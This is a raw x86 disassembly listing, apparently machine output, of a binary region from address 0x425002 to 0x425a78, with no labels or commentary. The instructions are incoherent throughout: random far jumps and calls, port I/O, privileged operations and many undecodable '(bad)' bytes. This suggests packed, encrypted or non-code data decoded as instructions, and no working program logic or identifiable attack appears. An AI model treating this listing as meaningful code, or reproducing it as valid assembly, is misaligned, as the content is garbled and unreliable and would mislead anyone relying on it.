  425002:	sbb    BYTE PTR [esi+0x18b6a],dh
  425008:	add    eax,0x14000001
  42500d:	call   0x3f0b:0x3c1d4257
  425014:	dec    edx
  425015:	adc    ebp,esp
  425017:	xchg   BYTE PTR [ebx],al
  425019:	lods   eax,DWORD PTR ds:[esi]
  42501a:	pop    ss
  42501b:	outs   dx,DWORD PTR ds:[esi]
  42501c:	test   DWORD PTR [edi+0x711c568c],edi
  425022:	jb     0x424fcc
  425024:	mov    eax,ds:0x8c0814ac
  425029:	daa    
  42502a:	test   eax,0x6f0964e1
  42502f:	xor    cl,BYTE PTR [ebx+ebp*2+0x30]
  425033:	push   0x61
  425035:	and    dl,dh
  425037:	mov    edi,0x4e75648e
  42503c:	jmp    0x18f:0xc2c160fd
  425043:	mov    eax,DWORD PTR [edi]
  425045:	cdq    
  425046:	stos   DWORD PTR es:[edi],eax
  425047:	and    ecx,edx
  425049:	outs   dx,DWORD PTR ds:[esi]
  42504a:	popf   
  42504b:	inc    ebp
  42504c:	mov    ecx,0x9776c84b
  425051:	pop    ebp
  425052:	mov    ebx,0x69a10a80
  425057:	add    edi,DWORD PTR [esp+ecx*8+0x27]
  42505b:	rol    DWORD PTR [ecx+0x52],1
  42505e:	or     eax,0x436d5bc6
  425063:	ja     0x425041
  425065:	ins    DWORD PTR es:[edi],dx
  425066:	pop    edi
  425067:	ins    BYTE PTR es:[edi],dx
  425068:	mov    dh,0xe3
  42506a:	mov    dh,BYTE PTR [edx-0x6ae20cea]
  425070:	pop    esp
  425071:	adc    bl,ah
  425073:	xor    eax,esi
  425075:	mov    ds:0x1663ca44,eax
  42507a:	jbe    0x42507a
  42507c:	jmp    0x4671:0x3958c780
  425083:	out    dx,al
  425084:	xchg   esi,eax
  425085:	push   ecx
  425086:	dec    edx
  425087:	mov    dh,0x93
  425089:	jae    0x425043
  42508b:	shl    DWORD PTR [ebx+0x6fa73f9b],1
  425091:	jns    0x4250ad
  425093:	dec    ebp
  425094:	dec    edi
  425095:	jecxz  0x42507f
  425097:	sub    al,0x7
  425099:	call   0x2e0b:0xaa2bc48a
  4250a0:	mov    eax,ds:0x640edf86
  4250a5:	push   esp
  4250a6:	loopne 0x4250c9
  4250a8:	inc    edi
  4250a9:	call   0x9d54ac31
  4250ae:	icebp  
  4250af:	jg     0x425093
  4250b1:	mov    DWORD PTR [edx-0x151d809a],ebp
  4250b7:	sbb    al,0x2a
  4250b9:	inc    ecx
  4250ba:	mov    BYTE PTR [edx+0x41],bh
  4250bd:	test   DWORD PTR [esi+0x237affa5],esp
  4250c3:	in     eax,0x8
  4250c5:	add    BYTE PTR [eax+0x21b2df79],cl
  4250cb:	adc    edx,ebp
  4250cd:	nop
  4250ce:	cmp    ecx,esp
  4250d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250d1:	aad    0x82
  4250d3:	cmp    BYTE PTR [eax-0x2a],0x1d
  4250d7:	fstp   DWORD PTR [ebp+0x72240f1c]
  4250dd:	repnz call 0xccaa:0x98cd925d
  4250e5:	adc    DWORD PTR [eax+0x4a],esp
  4250e8:	jno    0x425138
  4250ea:	in     al,dx
  4250eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250ec:	les    eax,FWORD PTR [edx-0x271e7e77]
  4250f2:	mov    ah,0xa4
  4250f4:	add    al,0x8f
  4250f6:	inc    esi
  4250f7:	and    ecx,ebx
  4250f9:	mov    bl,0x22
  4250fb:	test   al,0x3a
  4250fd:	cmp    ecx,DWORD PTR [edi+0x6493ddad]
  425103:	cmp    eax,0xac918b8
  425108:	fld    QWORD PTR [edi-0x3ad092ff]
  42510e:	fist   DWORD PTR [esi+0x71]
	...
  425171:	add    BYTE PTR [eax],al
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x8447:0x7ebb92e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0xf3000001,al
  42518d:	dec    edx
  42518e:	cmp    ecx,DWORD PTR [ecx-0x5faab258]
  425194:	fld    TBYTE PTR [esi]
  425196:	or     bl,BYTE PTR [ecx]
  425198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425199:	sar    BYTE PTR [ebp-0xc],cl
  42519c:	(bad)  
  42519d:	lods   eax,DWORD PTR ds:[esi]
  42519e:	sbb    bh,bh
  4251a0:	je     0x42514c
  4251a2:	or     bh,BYTE PTR [ebx+0x5d]
  4251a5:	outs   dx,BYTE PTR ds:[esi]
  4251a6:	loop   0x425187
  4251a8:	cmp    eax,0x1
  4251ab:	ror    DWORD PTR [esi+eiz*8+0x3f76bec],1
  4251b2:	and    edi,edi
  4251b4:	dec    eax
  4251b5:	jecxz  0x42513b
  4251b7:	jo     0x4251d4
  4251b9:	pop    eax
  4251ba:	ds cmp esi,ebx
  4251bd:	add    bh,BYTE PTR [esi+0x53]
  4251c0:	out    dx,eax
  4251c1:	int    0x25
  4251c3:	mov    WORD PTR [eax-0x2a],ds
  4251c6:	into   
  4251c7:	jp     0x42516a
  4251c9:	pop    ebx
  4251ca:	test   DWORD PTR [ebx+0x3766bf77],0x51cd4f63
  4251d4:	mov    ss,WORD PTR [eax+0x3a39f40c]
  4251da:	mov    DWORD PTR [edi+0x24],edi
  4251dd:	inc    edx
  4251de:	pop    ebp
  4251df:	cmp    ebp,ebp
  4251e1:	pop    edx
  4251e2:	sti    
  4251e3:	cmc    
  4251e4:	dec    edx
  4251e5:	xor    BYTE PTR [edi-0x1ba1e82f],cl
  4251eb:	inc    esi
  4251ec:	cdq    
  4251ed:	in     eax,dx
  4251ee:	xchg   esp,eax
  4251ef:	dec    ebp
  4251f0:	push   esi
  4251f1:	stos   DWORD PTR es:[edi],eax
  4251f2:	adc    BYTE PTR [eax+0x5c],dh
  4251f5:	loopne 0x425177
  4251f7:	fucomp st(6)
  4251f9:	xchg   esi,eax
  4251fa:	dec    ecx
  4251fb:	dec    esi
  4251fc:	in     eax,dx
  4251fd:	dec    ebp
  4251fe:	cmp    cl,BYTE PTR [eax]
  425200:	test   eax,0x453c4fe6
  425205:	test   DWORD PTR [eax+edx*8-0x15],edi
  425209:	add    DWORD PTR [esi],edx
  42520b:	retf   0x766d
  42520e:	pop    ecx
  42520f:	push   ecx
  425210:	or     ebx,ecx
  425212:	adc    bl,BYTE PTR gs:[ebx+0x1e8f0dfd]
  425219:	pop    ebx
  42521a:	int3   
  42521b:	add    bl,BYTE PTR [eax]
  42521d:	ret    
  42521e:	mov    bh,0xb2
  425220:	test   DWORD PTR [ecx-0x53],eax
  425223:	mov    ah,0xed
  425225:	push   ebp
  425226:	sbb    al,0x6a
  425228:	aaa    
  425229:	adc    ah,BYTE PTR [ebx+0x38]
  42522c:	inc    esi
  42522d:	(bad)  [eax+0x28]
  425230:	or     BYTE PTR [edi],bl
  425232:	data16 cmc 
  425234:	cmp    al,0x85
  425236:	dec    cx
  425238:	int    0x36
  42523a:	lock jnp 0x425252
  42523d:	xor    eax,0xb786b325
  425242:	shl    BYTE PTR [edi-0x9],cl
  425245:	jns    0x4252bd
  425247:	enter  0x409b,0x99
  42524b:	ins    DWORD PTR es:[edi],dx
  42524c:	adc    bh,BYTE PTR [ebx+0x32e93631]
  425252:	sbb    dh,0x14
  425255:	scas   al,BYTE PTR es:[edi]
  425256:	dec    ebx
  425257:	and    edx,DWORD PTR [edi-0x666d4cf1]
  42525d:	es das 
  42525f:	(bad)  
  425260:	jne    0x425298
  425262:	(bad)  
  425263:	push   eax
  425264:	in     al,dx
  425265:	shl    BYTE PTR [ebp+0x141076f6],cl
  42526b:	pop    esi
  42526c:	xor    eax,0xc13bc9e1
  425271:	in     eax,0x85
  425273:	push   eax
  425274:	bnd jns 0x4252b6
  425277:	inc    eax
  425278:	jg     0x42521b
  42527a:	call   0x64d9c442
  42527f:	jno    0x425262
  425281:	add    ch,BYTE PTR [edi]
  425283:	retf   
  425284:	push   0x92672a2f
  425289:	push   0xfffffffc
  42528b:	fisubr WORD PTR [esi+0x56ca45d3]
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	pop    esp
  425301:	rep stos DWORD PTR es:[edi],eax
  425303:	dec    ebp
  425304:	je     0x425293
  425306:	add    DWORD PTR [eax],eax
  425308:	add    eax,0x44000001
  42530d:	nop
  42530e:	fisub  DWORD PTR [ecx+0x40a7d0b7]
  425314:	pop    edi
  425315:	mov    dh,0x7d
  425317:	retf   
  425318:	cmp    esi,edx
  42531a:	push   ds
  42531b:	pop    esi
  42531c:	adc    bl,dh
  42531e:	int    0xea
  425320:	test   al,0xca
  425322:	add    al,0xbb
  425324:	and    al,0x25
  425326:	pusha  
  425327:	pop    es
  425328:	retf   0x7d92
  42532b:	and    al,0x54
  42532d:	sbb    BYTE PTR [ecx+0x11],al
  425330:	ins    BYTE PTR es:[edi],dx
  425331:	repz rcr DWORD PTR [ecx],1
  425334:	push   0xffffff90
  425336:	fmul   DWORD PTR [esi-0x780d085b]
  42533c:	dec    eax
  42533d:	adc    dh,BYTE PTR [ebx-0x74]
  425340:	sbb    dl,BYTE PTR [edx-0x49]
  425343:	xchg   ebx,eax
  425344:	dec    edi
  425345:	aam    0x1a
  425347:	lods   eax,DWORD PTR ds:[esi]
  425348:	sbb    bl,dl
  42534a:	les    esi,FWORD PTR [esi]
  42534c:	shl    cl,1
  42534e:	rcr    DWORD PTR [esi+0x14d89782],1
  425354:	je     0x425395
  425356:	bnd jnp 0x42532d
  425359:	or     eax,0x18
  42535c:	sub    eax,0x60305220
  425361:	xchg   ecx,eax
  425362:	pop    ecx
  425363:	or     WORD PTR [ecx-0x69],bx
  425367:	add    BYTE PTR [ebp+0x4cc265d1],al
  42536d:	retf   
  42536e:	pop    ebx
  42536f:	mov    esi,ebx
  425371:	add    al,0x4b
  425373:	jp     0x4253b4
  425375:	push   ebp
  425376:	add    ebx,edx
  425378:	xor    ch,BYTE PTR [edx]
  42537a:	sti    
  42537b:	es dec ebx
  42537d:	lds    ebp,FWORD PTR [esi+edx*8-0x2143e896]
  425384:	or     eax,0xa0cfbdc5
  425389:	cmp    ebp,ecx
  42538b:	ja     0x4253fb
  42538d:	pop    esi
  42538e:	dec    esp
  42538f:	mov    DWORD PTR [edi-0x3d],esi
  425392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425393:	mov    bl,0x1c
  425395:	xor    BYTE PTR [edi+0x11],0xe0
  425399:	mov    bh,0x1e
  42539b:	jbe    0x425410
  42539d:	mov    esi,0xe3385b0f
  4253a2:	popw   ss
  4253a4:	loop   0x4253d5
  4253a6:	aad    0x72
  4253a8:	(bad)  
  4253a9:	and    DWORD PTR [esi+0x67549f7a],edi
  4253af:	leavew 
  4253b1:	or     eax,0xceeba37d
  4253b6:	fimul  WORD PTR [edx]
  4253b8:	push   ecx
  4253b9:	pop    ebp
  4253ba:	out    dx,eax
  4253bb:	arpl   WORD PTR [esi+0x49a7ae5c],di
  4253c1:	ins    BYTE PTR es:[edi],dx
  4253c2:	fisubr DWORD PTR [edx-0x4c50bc78]
  4253c8:	ds cli 
  4253ca:	ins    DWORD PTR es:[edi],dx
  4253cb:	shr    DWORD PTR [edi+0x6a16a7c5],0xe8
  4253d2:	xor    ch,BYTE PTR [ebx+eax*4-0xf2f656]
  4253d9:	imul   ebp,DWORD PTR [eax+edx*4],0xfffffff7
  4253dd:	xchg   ebx,eax
  4253de:	neg    bh
  4253e0:	inc    ebx
  4253e1:	mov    ch,0x33
  4253e3:	clc    
  4253e4:	xor    BYTE PTR [edx-0x2390ae33],dh
  4253ea:	mov    ah,0xb
  4253ec:	adc    eax,0x6559a8da
  4253f1:	out    0x1e,eax
  4253f3:	icebp  
  4253f4:	jne    0x425431
  4253f6:	cld    
  4253f7:	ror    DWORD PTR [eax+eax*4+0x56],0x27
  4253fc:	sti    
  4253fd:	ja     0x42540d
  4253ff:	test   bh,al
  425401:	pop    ecx
  425402:	icebp  
  425403:	je     0x42539a
  425405:	adc    al,0x6a
  425407:	adc    DWORD PTR [ebp-0x52],0x50d6aad7
  42540e:	dec    esi
  42540f:	inc    esi
  425410:	jo     0x425412
	...
  425472:	add    BYTE PTR [eax],al
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebx,DWORD PTR [ebx-0x6e]
  425482:	pop    esi
  425483:	add    bh,BYTE PTR [ecx-0x72]
  425486:	add    DWORD PTR [eax],eax
  425488:	add    eax,0x67000001
  42548d:	cmp    bl,ah
  42548f:	out    dx,eax
  425490:	pop    esi
  425491:	pop    ecx
  425492:	daa    
  425493:	into   
  425494:	mov    esp,DWORD PTR [eax+esi*2+0x723a8f5b]
  42549b:	(bad)  
  42549c:	fcom   QWORD PTR [ebx+0x5c]
  42549f:	pushf  
  4254a0:	loop   0x42543b
  4254a2:	(bad)  
  4254a3:	daa    
  4254a4:	push   0x6c
  4254a6:	pop    ss
  4254a7:	push   edx
  4254a8:	inc    ecx
  4254a9:	in     eax,dx
  4254aa:	push   eax
  4254ab:	push   edi
  4254ac:	jecxz  0x42551b
  4254ae:	pop    esp
  4254af:	ror    BYTE PTR [edi+0x1a3adfe],1
  4254b5:	adc    eax,ebx
  4254b7:	jmp    0x425512
  4254b9:	sub    eax,0x264d64e4
  4254be:	scas   al,BYTE PTR es:[edi]
  4254bf:	cmp    al,0x4f
  4254c1:	shl    ebx,cl
  4254c3:	int    0x9f
  4254c5:	mov    al,ch
  4254c7:	adc    DWORD PTR ds:0x9dafbf46,eax
  4254cd:	sbb    DWORD PTR [ecx-0x7f],ebx
  4254d0:	enter  0x41f5,0xca
  4254d4:	outs   dx,BYTE PTR ds:[esi]
  4254d5:	in     eax,0x5f
  4254d7:	out    0xa7,eax
  4254d9:	inc    edx
  4254da:	retf   0xbfde
  4254dd:	into   
  4254de:	xchg   edi,eax
  4254df:	sbb    edx,ebp
  4254e1:	inc    esi
  4254e2:	mov    ds:0xcbb8a38c,eax
  4254e7:	mov    eax,DWORD PTR [edx-0x13]
  4254ea:	test   DWORD PTR [ecx],ebx
  4254ec:	mov    ss,ecx
  4254ee:	fs gs cmp edx,edx
  4254f2:	mov    al,ds:0x9b1a5dc2
  4254f7:	dec    eax
  4254f8:	pop    eax
  4254f9:	xlat   BYTE PTR ds:[ebx]
  4254fa:	or     eax,DWORD PTR [edx+0x32]
  4254fd:	int3   
  4254fe:	aaa    
  4254ff:	or     bl,dl
  425501:	push   eax
  425502:	and    BYTE PTR [esi+0x74],dl
  425505:	ins    DWORD PTR es:[edi],dx
  425506:	rol    DWORD PTR gs:[ebp-0x18],1
  42550a:	xchg   ebp,eax
  42550b:	pop    ebp
  42550c:	mov    DWORD PTR [ebx+edx*1-0x4],esi
  425510:	je     0x425522
  425512:	fisttp QWORD PTR [edx]
  425514:	addr16 pop ss
  425516:	xchg   DWORD PTR [ecx+0x840b527],esp
  42551c:	mov    ebp,0x48473722
  425521:	dec    ebp
  425522:	in     al,0x5f
  425524:	iret   
  425525:	retf   
  425526:	(bad)  
  425527:	jmp    0x21fe9b6
  42552c:	pop    ecx
  42552d:	nop
  42552e:	mov    bh,0xd6
  425530:	stc    
  425531:	and    al,0x67
  425533:	pop    ds
  425534:	bound  ebx,QWORD PTR ds:0xc7504dfa
  42553a:	push   ebp
  42553b:	cs pop ebp
  42553d:	xchg   ebx,eax
  42553e:	dec    edi
  42553f:	xlat   BYTE PTR ds:[ebx]
  425540:	sub    dh,BYTE PTR [ebx+0x4dadb6a4]
  425546:	and    esi,esi
  425548:	ja     0x425511
  42554a:	sbb    DWORD PTR [ebx],ebx
  42554c:	cld    
  42554d:	mul    ah
  42554f:	jp     0x42554c
  425551:	jg     0x425507
  425553:	ja     0x42555d
  425555:	xor    eax,0x53ebe4c
  42555a:	stos   DWORD PTR es:[edi],eax
  42555b:	out    dx,eax
  42555c:	addr16 lahf 
  42555e:	pop    es
  42555f:	dec    esi
  425560:	or     DWORD PTR [esi],eax
  425562:	xchg   DWORD PTR [ebp-0x31e35e9f],ebx
  425568:	es xchg esi,eax
  42556a:	cld    
  42556b:	jns    0x425558
  42556d:	sbb    edi,edx
  42556f:	fmul   QWORD PTR [edx]
  425571:	dec    edi
  425572:	xchg   esi,eax
  425573:	mov    dl,0xfe
  425575:	xchg   DWORD PTR [eax],ebp
  425577:	push   ecx
  425578:	(bad)  [ecx-0x56f8c390]
  42557e:	repz xchg esp,eax
  425580:	mov    edx,0x8ac225bf
  425585:	push   ebp
  425586:	mov    dl,BYTE PTR [esi]
  425588:	fld    QWORD PTR [eax+ebx*2+0x781e92d5]
  42558f:	sub    esi,DWORD PTR [edi+0x0]
	...
  4255f2:	add    BYTE PTR [eax],al
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0xb671f13a
  425602:	loop   0x425594
  425604:	jle    0x425595
  425606:	add    DWORD PTR [eax],eax
  425608:	add    eax,0x59000001
  42560d:	mov    WORD PTR [ebx+0x2],es
  425610:	je     0x4255b7
  425612:	inc    ebp
  425613:	ror    DWORD PTR [esi+0x1f],0x19
  425617:	call   0x6871f545
  42561c:	pop    ss
  42561d:	sbb    esp,DWORD PTR [ebx]
  42561f:	ret    
  425620:	popa   
  425621:	arpl   WORD PTR [ebx+0x3],cx
  425624:	xchg   edi,eax
  425625:	dec    edx
  425626:	fstp   QWORD PTR [edx+0x6e]
  425629:	into   
  42562a:	dec    edx
  42562b:	in     eax,dx
  42562c:	in     eax,dx
  42562d:	push   edi
  42562e:	sbb    esp,DWORD PTR [edi+0x201dafb9]
  425634:	stos   BYTE PTR es:[edi],al
  425635:	test   eax,0x68eee938
  42563a:	mov    dh,0x23
  42563c:	jbe    0x425642
  42563e:	je     0x4256a2
  425640:	jnp    0x4255f1
  425642:	add    DWORD PTR [ebp+0x119dcc4],eax
  425648:	ficom  DWORD PTR [esi-0x1a8c5f16]
  42564e:	pop    edx
  42564f:	fsub   QWORD PTR [ebx-0x585f2185]
  425655:	mov    cl,0x96
  425657:	fistp  QWORD PTR [esi]
  425659:	out    dx,eax
  42565a:	adc    dl,BYTE PTR fs:[eax-0x28]
  42565e:	and    ah,BYTE PTR [edi+esi*1-0x4f]
  425662:	std    
  425663:	pop    ecx
  425664:	nop
  425665:	pop    ss
  425666:	ret    
  425667:	or     ebp,ecx
  425669:	lock and edi,DWORD PTR [esi]
  42566c:	(bad)  
  42566d:	(bad)  
  42566e:	scas   eax,DWORD PTR es:[edi]
  42566f:	pop    esp
  425670:	adc    al,0x40
  425672:	xchg   esi,eax
  425673:	push   eax
  425674:	fadd   DWORD PTR [ecx+0x5f1227fe]
  42567a:	xchg   esi,eax
  42567b:	jne    0x425650
  42567d:	iret   
  42567e:	mov    dh,0x51
  425680:	push   edi
  425681:	adc    eax,0xc484646b
  425686:	test   al,0xce
  425688:	or     BYTE PTR [edx],0xe8
  42568b:	pop    esi
  42568c:	in     al,dx
  42568d:	sbb    eax,0xb39b7cdb
  425692:	stos   DWORD PTR es:[edi],eax
  425693:	ret    0xe185
  425696:	neg    edx
  425698:	out    0x15,eax
  42569a:	inc    eax
  42569b:	push   edi
  42569c:	mov    edi,0x22a1c933
  4256a1:	cmp    eax,0xb26730cc
  4256a6:	in     eax,dx
  4256a7:	xor    edi,edx
  4256a9:	sub    dl,BYTE PTR [ebx]
  4256ab:	dec    edi
  4256ac:	cmp    DWORD PTR [ebx+0x4181f3c7],edi
  4256b2:	out    dx,eax
  4256b3:	mov    bh,0x20
  4256b5:	psubsb mm2,QWORD PTR [edi+edx*4-0x36]
  4256ba:	rcl    DWORD PTR [ecx],0x81
  4256bd:	imul   esp,DWORD PTR [edi+0x1f1851b0],0x861cc6c4
  4256c7:	lea    esp,[edx+edi*8+0x55]
  4256cb:	push   edi
  4256cc:	cmp    DWORD PTR [ebx+0x5f],edi
  4256cf:	dec    ebp
  4256d0:	pop    edx
  4256d1:	jg     0x42570e
  4256d3:	jns    0x425748
  4256d5:	scas   al,BYTE PTR es:[edi]
  4256d6:	in     eax,0x12
  4256d8:	cmp    eax,0x94bb3f89
  4256dd:	cmp    dh,BYTE PTR [ecx]
  4256df:	adc    BYTE PTR [ecx+0x3056a357],0xd9
  4256e6:	sbb    BYTE PTR ds:0xf5f6b2c8,0x44
  4256ed:	push   cs
  4256ee:	pusha  
  4256ef:	sub    cl,BYTE PTR [esi-0x3f]
  4256f2:	xor    bl,cl
  4256f4:	outs   dx,BYTE PTR ds:[esi]
  4256f5:	xor    bl,bl
  4256f7:	cmp    ebp,DWORD PTR [ebx-0x41bb6512]
  4256fd:	lea    esi,ss:[esi]
  425700:	adc    al,0x93
  425702:	test   eax,0x4a6fece2
  425707:	idiv   DWORD PTR [ebx+0x46]
  42570a:	call   0x634f837
  42570f:	mov    ebx,DWORD PTR [ecx+0x0]
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xcfab1474
  425783:	jmp    0x105:0x19083
  42578a:	add    BYTE PTR [eax],al
  42578c:	sbb    ah,BYTE PTR [ecx+ecx*1]
  42578f:	mov    ebp,0x14bed0aa
  425794:	icebp  
  425795:	sbb    DWORD PTR [esi-0x80],esi
  425798:	jmp    0xcba5:0xad1f9bba
  42579f:	lds    eax,FWORD PTR [edx+edi*1-0x42c1dc91]
  4257a6:	repz jge 0x42581b
  4257a9:	mov    bl,BYTE PTR [edx-0x5c]
  4257ac:	pop    ebx
  4257ad:	clc    
  4257ae:	sahf   
  4257af:	pop    ss
  4257b0:	inc    esi
  4257b1:	mov    esi,0x1552d788
  4257b6:	dec    ebx
  4257b7:	stos   BYTE PTR es:[edi],al
  4257b8:	xor    eax,0xf87d11b1
  4257bd:	mov    ebp,DWORD PTR [ebx-0x17111ea7]
  4257c3:	call   0x8abb:0xc01eabd3
  4257ca:	cdq    
  4257cb:	enter  0xa037,0x6a
  4257cf:	stos   DWORD PTR es:[edi],eax
  4257d0:	test   al,0x13
  4257d2:	or     DWORD PTR [edx-0xf489fce],eax
  4257d8:	jnp    0x4257b3
  4257da:	enter  0xbac5,0x22
  4257de:	xor    bh,dl
  4257e0:	cld    
  4257e1:	in     eax,0xe4
  4257e3:	pop    edi
  4257e4:	push   ecx
  4257e5:	jo     0x42582f
  4257e7:	ins    DWORD PTR es:[edi],dx
  4257e8:	sub    esp,edi
  4257ea:	cdq    
  4257eb:	addr16 mov ebp,0x10197e3e
  4257f1:	inc    ebx
  4257f2:	dec    edi
  4257f3:	dec    ebx
  4257f4:	retf   0x5157
  4257f7:	sub    al,0xd5
  4257f9:	cmc    
  4257fa:	(bad)  
  4257fc:	and    BYTE PTR [edi-0x6391f97b],cl
  425802:	xlat   BYTE PTR ds:[ebx]
  425803:	mov    ebp,0x6eda07d6
  425808:	in     al,0xe2
  42580a:	out    0x86,al
  42580c:	ins    DWORD PTR es:[edi],dx
  42580d:	pop    edi
  42580e:	js     0x4257bf
  425810:	cdq    
  425811:	or     eax,0xac5a9d64
  425816:	clc    
  425817:	xor    DWORD PTR [esi-0x12],ebp
  42581a:	jb     0x42588d
  42581c:	cli    
  42581d:	sub    BYTE PTR [ecx-0x5c247dc9],bh
  425823:	mov    esi,0x5ce70332
  425828:	cmp    dl,BYTE PTR [edx-0x7ad51f9a]
  42582e:	shrd   DWORD PTR [eax+0x46],ecx,0xf1
  425833:	lock fiadd WORD PTR [eax-0xdb97cbc]
  42583a:	cli    
  42583b:	xchg   edx,eax
  42583d:	and    edi,DWORD PTR ds:0xac671e9a
  425843:	jmp    0xeaf:0x682f53f5
  42584a:	xor    edi,ebp
  42584c:	adc    DWORD PTR [ecx+0x75],ecx
  42584f:	jo     0x4257d2
  425851:	mov    ebx,0x8441c555
  425856:	or     DWORD PTR [eax],eax
  425858:	out    dx,eax
  425859:	adc    bl,dh
  42585b:	mov    BYTE PTR [esi+0x387545e9],al
  425861:	shl    ecx,0x7
  425864:	push   0xa4e7b30d
  425869:	inc    ebp
  42586a:	push   es
  42586b:	adc    bl,BYTE PTR [edx+0x709c8d2c]
  425871:	daa    
  425872:	xor    ebx,eax
  425874:	cdq    
  425875:	pusha  
  425876:	cmp    eax,0xca912809
  42587b:	into   
  42587c:	das    
  42587d:	mov    edx,0x87709d4e
  425882:	loope  0x4258a7
  425884:	test   BYTE PTR [eax-0x79d0ee9c],ch
  42588a:	jno    0x425831
  42588c:	outs   dx,DWORD PTR ds:[esi]
  42588d:	pop    ss
  42588e:	mov    eax,0x8817
	...
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	push   cs
  425901:	mov    edx,0x9188ac3e
  425906:	add    DWORD PTR [eax],eax
  425908:	add    eax,0x63000001
  42590d:	or     al,0x7f
  42590f:	push   0xffffffc4
  425911:	xchg   DWORD PTR [ebx+0x3b61df92],edx
  425917:	lock jmp 0x42589d
  42591a:	nop
  42591b:	pop    esi
  42591c:	pusha  
  42591d:	nop
  42591e:	inc    edi
  42591f:	(bad)  
  425920:	pop    ebx
  425921:	or     DWORD PTR [edx+0x139ad956],edi
  425927:	ffreep st(2)
  425929:	mov    ebx,0xfae851b7
  42592e:	dec    DWORD PTR [ecx+eax*1]
  425931:	jmp    0x4852689b
  425936:	jns    0x42595c
  425938:	cs mov esp,0x26d532d7
  42593e:	push   ss
  42593f:	xchg   BYTE PTR [ebx],cl
  425941:	and    esi,DWORD PTR ds:0x7bfe817a
  425947:	icebp  
  425948:	inc    ecx
  425949:	add    cl,BYTE PTR [ebp-0x3c]
  42594c:	test   eax,ebp
  42594e:	imul   esi,DWORD PTR [edi-0x5f],0xc2fa9d16
  425955:	daa    
  425956:	and    edi,eax
  425958:	xor    ah,bh
  42595a:	iret   
  42595b:	test   BYTE PTR [ebx-0x58],ah
  42595e:	pop    ss
  42595f:	fisttp QWORD PTR [edi]
  425961:	ins    BYTE PTR es:[edi],dx
  425962:	out    0x67,eax
  425964:	cwde   
  425965:	inc    esp
  425966:	and    DWORD PTR [edx],eax
  425968:	jno    0x425970
  42596a:	inc    esp
  42596b:	push   ecx
  42596c:	mov    cl,0x36
  42596e:	fcom   QWORD PTR [ebx]
  425970:	(bad)  
  425972:	fs dec edx
  425974:	sahf   
  425975:	xchg   edx,eax
  425976:	mov    ds:0xd9a07a8a,eax
  42597b:	es retf 
  42597d:	xchg   ecx,eax
  42597e:	ins    DWORD PTR es:[edi],dx
  42597f:	add    BYTE PTR [ebx+0xdc26813],cl
  425985:	push   ecx
  425986:	xor    BYTE PTR [esi],bh
  425988:	xor    BYTE PTR [eax],0xa7
  42598b:	(bad)  
  42598c:	stc    
  42598d:	add    eax,edi
  42598f:	xor    eax,0x14470365
  425994:	imul   BYTE PTR [ebx-0x2acf6b73]
  42599a:	cmp    BYTE PTR [edi-0x40],bl
  42599d:	pop    ds
  42599e:	pushf  
  42599f:	add    ebx,DWORD PTR [ebp+0x46]
  4259a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259a4:	cli    
  4259a5:	shl    BYTE PTR [eax+0x61],cl
  4259a8:	jb     0x425a25
  4259aa:	xchg   ecx,eax
  4259ab:	push   es
  4259ac:	xor    DWORD PTR [ebx+0x5167135b],0x14f3490b
  4259b6:	xor    edx,esp
  4259b8:	scas   al,BYTE PTR es:[edi]
  4259b9:	aaa    
  4259ba:	dec    edi
  4259bb:	test   BYTE PTR [esi+edi*8],bh
  4259be:	repnz mov ch,0x9b
  4259c1:	add    eax,0x8de60321
  4259c6:	rcr    DWORD PTR [ebx-0x4dfacf78],0x3a
  4259cd:	and    ch,BYTE PTR [ebp+ebx*2+0x5bc13e2b]
  4259d4:	in     eax,dx
  4259d5:	out    0xd8,eax
  4259d7:	rcl    BYTE PTR [ebp-0x47],cl
  4259da:	(bad)  
  4259db:	lock stos BYTE PTR es:[edi],al
  4259dd:	pusha  
  4259de:	popa   
  4259df:	stc    
  4259e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259e1:	outs   dx,DWORD PTR ds:[esi]
  4259e2:	push   edi
  4259e3:	into   
  4259e4:	jne    0x425a16
  4259e6:	je     0x4259e6
  4259e8:	dec    edi
  4259e9:	push   esp
  4259ea:	push   esi
  4259eb:	loope  0x425a56
  4259ed:	add    eax,0x8865b399
  4259f2:	mov    ah,0xcd
  4259f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259f6:	mov    al,ds:0x1373679d
  4259fb:	aaa    
  4259fc:	xchg   ecx,eax
  4259fd:	(bad)  
  4259fe:	jmp    0x6e12e3a9
  425a03:	mov    WORD PTR es:[eax+0x5d],ss
  425a07:	cmp    DWORD PTR [eax-0x1641dec4],eax
  425a0d:	mov    dh,0x42
  425a0f:	push   edi
  425a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
